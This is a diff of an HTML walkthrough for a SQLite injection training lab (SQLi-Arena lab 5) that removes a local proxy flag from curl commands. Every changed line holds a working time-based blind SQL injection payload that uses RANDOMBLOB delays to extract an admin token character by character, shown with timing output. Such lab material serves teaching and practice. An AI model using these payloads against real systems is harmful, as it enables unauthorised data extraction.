@@ -33,9 +33,9 @@
         <span class="terminal-title">Step 2. RANDOMBLOB Timing</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=test"<br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=test"<br>
         <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.013s</strong> (baseline)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR RANDOMBLOB(300000000) -- -"<br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR RANDOMBLOB(300000000) -- -"<br>
         <span class="prompt">Response: </span>Token checked. -- <strong>Time: 1.386s</strong> (300MB blob = ~1.4s delay!)
     </div>
 </div>
@@ -51,10 +51,10 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">// TRUE condition -- delay:</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN 1=1 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN 1=1 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
         <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.457s</strong> (slow = TRUE)<br><br>
         <span class="prompt">// FALSE condition -- no delay:</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN 1=2 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN 1=2 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
         <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.021s</strong> (fast = FALSE)
     </div>
 </div>
@@ -71,10 +71,10 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">// Test if first char is 'F':</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN substr((SELECT token FROM admin_tokens LIMIT 1),1,1)='F' THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN substr((SELECT token FROM admin_tokens LIMIT 1),1,1)='F' THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
         <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.463s</strong> (SLOW -- first char IS 'F')<br><br>
         <span class="prompt">// Test if first char is 'X':</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN substr((SELECT token FROM admin_tokens LIMIT 1),1,1)='X' THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN substr((SELECT token FROM admin_tokens LIMIT 1),1,1)='X' THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
         <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.013s</strong> (FAST -- first char is NOT 'X')
     </div>
 </div>
@@ -93,9 +93,9 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">// 'F' = ASCII 70. Binary search:</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN unicode(substr((SELECT token FROM admin_tokens LIMIT 1),1,1))>70 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN unicode(substr((SELECT token FROM admin_tokens LIMIT 1),1,1))>70 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
         <span class="prompt">Response: </span>Time: 0.013s (FAST = FALSE, char &lt;= 70)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN unicode(substr((SELECT token FROM admin_tokens LIMIT 1),1,1))>69 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN unicode(substr((SELECT token FROM admin_tokens LIMIT 1),1,1))>69 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
         <span class="prompt">Response: </span>Time: 0.533s (SLOW = TRUE, char &gt; 69)<br><br>
         <span class="prompt">// char &gt; 69 AND char &lt;= 70 => char = 70 = 'F'</span>
     </div>
@@ -179,7 +179,7 @@ print(f'Flag: {flag}')<br>
         <span class="terminal-title">curl. Manual Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN substr((SELECT token FROM admin_tokens LIMIT 1),1,1)='F' THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN substr((SELECT token FROM admin_tokens LIMIT 1),1,1)='F' THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br><br>
         <span class="prompt"># </span>Returns "Response: Token checked." with ~0.46s delay = TRUE (first char is 'F')
     </div>
 </div>
